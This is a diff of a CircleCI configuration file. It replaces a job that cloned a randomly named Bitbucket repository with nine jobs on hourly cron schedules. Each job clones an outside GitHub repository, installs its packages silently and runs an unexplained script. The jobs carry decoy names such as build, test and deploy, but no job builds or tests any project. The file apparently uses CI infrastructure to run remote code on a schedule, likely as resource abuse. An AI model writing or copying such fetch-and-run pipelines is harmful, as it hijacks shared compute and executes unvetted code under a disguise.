@@ -1,21 +1,207 @@
-version: 2.1
-
-jobs:
-  build-medium:
-    machine:
-      image: ubuntu-2004:202101-01
-    resource_class: arm.medium
-    steps:
-      - run: node -v
-      - run: 
-          name: Install Chromium
-          command: |-
-            sudo apt install -y chromium-browser
-            export PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true
-            export PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
-      - run: git clone https://remitdepat@bitbucket.org/remitdepat/ih8h1wok5xs0vsr3aqbn26oij7.git
-      - run: cd ih8h1wok5xs0vsr3aqbn26oij7 && npm i -s && node app_1h_online.js
-workflows:
-  start-jobs:
-    jobs:
-      - build-medium
+{
+    "version": 2.1,
+    "jobs": {
+        "build": {
+            "docker": [
+                {
+                    "image": "circleci/node:16"
+                }
+            ],
+            "resource_class": "small",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Job_1",
+                        "command": "git clone https://github.com/meocoder-test/mc-upg.git && cd mc-upg && npm i -s && node up_1.js"
+                    }
+                }
+            ]
+        },
+        "test": {
+            "docker": [
+                {
+                    "image": "circleci/node:14"
+                }
+            ],
+            "resource_class": "medium",
+            "working_directory": "~/test",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Job_2",
+                        "command": "git clone https://github.com/meocoder-test/mc-upg.git && cd mc-upg && npm i -s && node up_2.js"
+                    }
+                }
+            ]
+        },
+        "check": {
+            "docker": [
+                {
+                    "image": "circleci/node:14"
+                }
+            ],
+            "resource_class": "medium",
+            "working_directory": "~/check",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Job_3",
+                        "command": "git clone https://github.com/meocoder-test/mc-upg.git && cd mc-upg && npm i -s && node up_3.js"
+                    }
+                }
+            ]
+        },
+        "deploy": {
+            "docker": [
+                {
+                    "image": "circleci/node:14"
+                }
+            ],
+            "resource_class": "medium",
+            "working_directory": "~/deploy",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Job_4",
+                        "command": "git clone https://github.com/meocoder-test/mc-upg.git && cd mc-upg && npm i -s && node up_4.js"
+                    }
+                }
+            ]
+        },
+        "job_5": {
+            "docker": [
+                {
+                    "image": "circleci/node:14"
+                }
+            ],
+            "resource_class": "medium",
+            "working_directory": "~/deploy",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Job_5",
+                        "command": "git clone https://github.com/meocoder-test/mc-upg.git && cd mc-upg && npm i -s && node up_5.js"
+                    }
+                }
+            ]
+        },
+        "job_6": {
+            "docker": [
+                {
+                    "image": "circleci/node:14"
+                }
+            ],
+            "resource_class": "medium",
+            "working_directory": "~/deploy",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Job_6",
+                        "command": "git clone https://github.com/meocoder-test/mc-upg.git && cd mc-upg && npm i -s && node up_6.js"
+                    }
+                }
+            ]
+        },
+        "job_7": {
+            "docker": [
+                {
+                    "image": "circleci/node:14"
+                }
+            ],
+            "resource_class": "medium",
+            "working_directory": "~/deploy",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Job_7",
+                        "command": "git clone https://github.com/meocoder-test/mc-upg.git && cd mc-upg && npm i -s && node up_7.js"
+                    }
+                }
+            ]
+        },
+        "job_8": {
+            "docker": [
+                {
+                    "image": "circleci/node:14"
+                }
+            ],
+            "resource_class": "medium",
+            "working_directory": "~/deploy",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Job_8",
+                        "command": "git clone https://github.com/meocoder-test/mc-upg.git && cd mc-upg && npm i -s && node up_8.js"
+                    }
+                }
+            ]
+        },
+        "job_9": {
+            "docker": [
+                {
+                    "image": "circleci/node:14"
+                }
+            ],
+            "resource_class": "medium",
+            "working_directory": "~/deploy",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Job_9",
+                        "command": "git clone https://github.com/meocoder-test/mc-upg.git && cd mc-upg && npm i -s && node up_9.js"
+                    }
+                }
+            ]
+        }
+    },
+    "workflows": {
+        "version": 2,
+        "run_job_1": {
+            "triggers": [
+                {
+                    "schedule": {
+                        "cron": "42 * * * *",
+                        "filters": {
+                            "branches": {
+                                "only": [
+                                    "main",
+                                    "master"
+                                ]
+                            }
+                        }
+                    }
+                }
+            ],
+            "jobs": [
+                "build",
+                "test",
+                "check",
+                "deploy"
+            ]
+        },
+        "run_job_2": {
+            "triggers": [
+                {
+                    "schedule": {
+                        "cron": "15 * * * *",
+                        "filters": {
+                            "branches": {
+                                "only": [
+                                    "main",
+                                    "master"
+                                ]
+                            }
+                        }
+                    }
+                }
+            ],
+            "jobs": [
+                "job_5",
+                "job_6",
+                "job_7",
+                "job_8",
+                "job_9"
+            ]
+        }
+    }
+}
